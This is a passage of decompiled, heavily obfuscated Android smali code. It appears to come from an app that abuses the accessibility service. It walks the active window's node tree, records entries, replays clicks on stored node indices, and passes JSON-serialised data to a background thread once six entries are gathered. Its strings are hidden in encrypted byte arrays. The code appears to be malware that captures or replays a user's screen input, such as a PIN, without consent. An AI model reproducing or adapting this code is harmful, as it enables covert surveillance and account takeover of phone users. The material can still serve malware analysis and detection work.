.end method

.method private static d()V
    .locals 5

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v2, 0x0

    :goto_0
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->e()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-static {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/eq;->a(Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;)Lorg/json/JSONObject;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    add-int/lit8 v3, v3, -0x1

    if-eq v2, v3, :cond_0

    const/16 v3, 0x12

    new-array v3, v3, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v4, v4, [B

    fill-array-data v4, :array_1

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :cond_0
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_1
    new-instance v2, Ljava/lang/Thread;

    new-instance v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl$a;

    invoke-direct {v3, v1, v0}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl$a;-><init>(Ljava/lang/StringBuilder;Ljava/lang/StringBuilder;)V

    invoke-direct {v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v2}, Ljava/lang/Thread;->start()V

    return-void

    nop

    :array_0
    .array-data 1
        -0x46t
        -0x14t
        -0x1et
        0x28t
        0x66t
        0xdt
        -0x44t
        0x7at
        -0x46t
        -0x13t
        -0x20t
        0x29t
        0x69t
        0xft
        -0x4ct
        0x76t
        -0x44t
        -0x14t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x2at
        -0x79t
        -0x7at
        0x4et
        0x1t
        0x67t
        -0x2et
        0x11t
    .end array-data
.end method

.method private static e(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 6

    .line 1
    const/16 v0, 0x8

    const/4 v1, 0x0

    if-nez p0, :cond_0

    const/4 p0, 0x6

    new-array p0, p0, [B

    fill-array-data p0, :array_0

    new-array v0, v0, [B

    fill-array-data v0, :array_1

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p0

    new-array v0, v1, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    return-void

    :cond_0
    sget-boolean v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->e:Z

    if-eqz v2, :cond_1

    return-void

    :cond_1
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->d:Ljava/util/ArrayList;

    invoke-virtual {v2}, Ljava/util/ArrayList;->clear()V

    move v2, v1

    :goto_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-ge v2, v3, :cond_5

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    const/16 v4, 0xb

    if-le v3, v4, :cond_2

    const/16 v3, 0x9

    if-ne v2, v3, :cond_2

    goto :goto_2

    :cond_2
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v3

    if-le v3, v4, :cond_3

    if-ne v2, v4, :cond_3

    const/4 v3, 0x1

    goto :goto_1

    :cond_3
    move v3, v1

    :goto_1
    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_4

    xor-int/lit8 v5, v3, 0x1

    invoke-static {v4, v3, v5, v2}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->a(Landroid/view/accessibility/AccessibilityNodeInfo;ZZI)V

    :cond_4
    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_5
    new-instance p0, Ljava/lang/StringBuilder;

    const/16 v2, 0xc

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v0, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move v2, v1

    :goto_3
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->d:Ljava/util/ArrayList;

    invoke-virtual {v3}, Ljava/util/ArrayList;->size()I

    move-result v4

    if-ge v2, v4, :cond_6

    invoke-virtual {v3, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->e()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x2

    new-array v3, v3, [B

    fill-array-data v3, :array_4

    new-array v4, v0, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_6
    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    new-array v0, v1, [Ljava/lang/Object;

    invoke-static {p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->j(Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V

    return-void

    :array_0
    .array-data 1
        0x17t
        -0x70t
        0x15t
        0x5ct
        -0x6ct
        0x6ft
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x10t
        0x39t
        -0x51t
        -0x48t
        0x2et
        -0x17t
        0x3dt
        -0x59t
    .end array-data

    :array_2
    .array-data 1
        0x7dt
        -0x6ft
        0xdt
        -0x66t
        -0x10t
        0x2et
        -0x74t
        0x1dt
        0x1ct
        -0x2dt
        0x29t
        -0x1bt
    .end array-data

    :array_3
    .array-data 1
        -0x68t
        0x3ct
        -0x6bt
        0x7ft
        0x75t
        -0x75t
        0x6bt
        -0x79t
    .end array-data

    :array_4
    .array-data 1
        0x2ft
        -0x8t
    .end array-data

    nop

    :array_5
    .array-data 1
        0xft
        -0x2ct
        0x67t
        0x2bt
        0x26t
        0x1dt
        -0x5ct
        -0x49t
    .end array-data
.end method

.method private static f()V
    .locals 6

    .line 1
    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->p:Z

    if-eqz v0, :cond_2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->p:Z

    new-instance v1, Ljava/lang/StringBuilder;

    const/16 v2, 0xb

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v3, v3, [B

    fill-array-data v3, :array_1

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->c()Ljava/util/LinkedList;

    move-result-object v2

    move v3, v0

    :goto_0
    invoke-virtual {v2}, Ljava/util/LinkedList;->size()I

    move-result v4

    if-ge v3, v4, :cond_0

    sget-object v4, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v2, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v4, v5}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v3}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, "\r\n"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v2}, Ljava/util/LinkedList;->size()I

    move-result v2

    const/4 v3, 0x6

    if-ne v2, v3, :cond_1

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->d()V

    :cond_1
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-array v0, v0, [Ljava/lang/Object;

    invoke-static {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->k()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/LinkedList;->clear()V

    :cond_2
    return-void

    nop

    :array_0
    .array-data 1
        0x7ft
        0x10t
        -0x51t
        0x4ct
        0x10t
        0x18t
        0x15t
        0x77t
        0x2t
        -0x5at
        0x36t
    .end array-data

    :array_1
    .array-data 1
        -0x68t
        -0x55t
        0x3ct
        -0x56t
        -0x72t
        -0x7ct
        -0x6t
        -0x35t
    .end array-data
.end method

.method public static g()V
    .locals 5

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/sb0;->k()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v0}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sput-object v0, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->c:Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_0

    return-void

    :cond_0
    :try_start_0
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/4 v2, 0x3

    invoke-virtual {v0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->o:Z

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v0, 0x0

    :goto_0
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v2

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-le v2, v3, :cond_1

    move v2, v1

    :goto_1
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_1

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/OPJ5Xyvl;->b:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->c()I

    move-result v3

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    const/16 v4, 0x10

    invoke-virtual {v3, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const-wide/16 v3, 0xc8

    :try_start_1
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception v3

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->o:Z

    invoke-virtual {v3}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    :cond_1
    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->o:Z

    return-void
.end method
